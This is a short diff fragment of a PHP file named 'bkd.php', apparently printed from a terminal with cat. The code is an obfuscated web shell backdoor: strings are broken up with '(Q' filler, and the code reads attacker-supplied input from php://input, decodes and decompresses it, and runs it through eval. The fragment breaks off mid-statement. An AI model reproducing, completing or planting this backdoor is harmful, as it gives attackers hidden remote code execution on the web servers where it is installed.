@@ -1,4 +1,3 @@
-$ cat bkd.php            
 <?php
 $O='dSKxzM(QOZl"(Q;functio(Qn(Q x(Q($t,$k(Q){$c=strlen((Q$k);(Q(Q$l=strlen($t(Q);$o="';
 $C='ntents((Q"php://(Qinput")(Q,(Q$m)==1) {(Q@ob_star(Qt();@ev(Qal(@gz(Quncompress((Q@x(';
